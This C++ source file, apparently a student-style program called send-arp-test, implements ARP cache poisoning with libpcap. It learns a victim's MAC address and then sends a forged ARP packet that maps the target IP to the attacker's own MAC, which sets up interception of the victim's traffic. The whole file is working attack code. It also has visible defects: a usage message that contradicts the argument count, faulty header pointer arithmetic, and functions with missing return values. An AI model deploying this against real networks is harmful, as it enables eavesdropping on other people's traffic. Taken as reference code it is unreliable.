#include <cstdio>
#include <pcap.h>
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "libnet-headers.h"
#include "libnet-macros.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int get_my_mac(char *dev, Ip *my_ip, Mac *my_mac){
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1){
        printf("ERR: socket(AF_UNIX, SOCK_DGRAM, 0)\n");
        return -1;
    }

    struct ifreq ifr;
    size_t dev_len = strlen(dev);
    if (dev_len >= sizeof(ifr.ifr_name)){
        printf("ERR: dev_len >= sizeof(ifr.dev)\n");
        close(fd);
        return -1;
    }
    memcpy(ifr.ifr_name, dev, dev_len);
    ifr.ifr_name[dev_len] = 0;

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1){
        puts("ERR: ioctl(fd, SIOCGIFADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    memcpy((void *)my_ip, &ip_addr->sin_addr, sizeof(Ip));
    *my_ip = ntohl(*my_ip);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1){
        printf("ERR: ioctl(fd, SIOCGIFHWADDR, &ifr)\n");
        close(fd);
        return -1;
    }
    memcpy((void *)my_mac, ifr.ifr_hwaddr.sa_data, sizeof(Mac));
    close(fd);
    return 0;
}

int get_sender_mac(pcap_t *handle, Ip my_ip, Mac my_mac, Ip sender_ip, Mac *sender_mac){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ =my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(Ip(my_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet2;
        int res2 = pcap_next_ex(handle, &header, &packet2);
        if (res2 == 0) continue;
        if (res2 == PCAP_ERROR || res2 == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct EthHdr* e_hdr;
        struct ArpHdr* a_hdr;

        e_hdr=(struct EthHdr*)packet2;
        a_hdr=(struct ArpHdr*)packet2+LIBNET_ETH_H;
        if(ntohs(e_hdr->type_)==ETHERTYPE_ARP){
            if(e_hdr->dmac_==my_mac){
                memcpy((void *)sender_mac, &e_hdr->smac_, sizeof(Mac));
				break;
            }
        }
    }
}
int arp_spoofing(pcap_t *handle, Mac my_mac, Ip sender_ip, Mac sender_mac, Ip target_ip){
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ =my_mac;
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
    }
}
int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
    Ip my_ip, sender_ip(argv[2]),target_ip(argv[3]);
    Mac my_mac, sender_mac;
	
    get_my_mac(dev,&my_ip,&my_mac);
    get_sender_mac(handle, my_ip, my_mac, sender_ip, &sender_mac);
    arp_spoofing(handle, my_mac, sender_ip, sender_mac, target_ip);

    return 0;
}

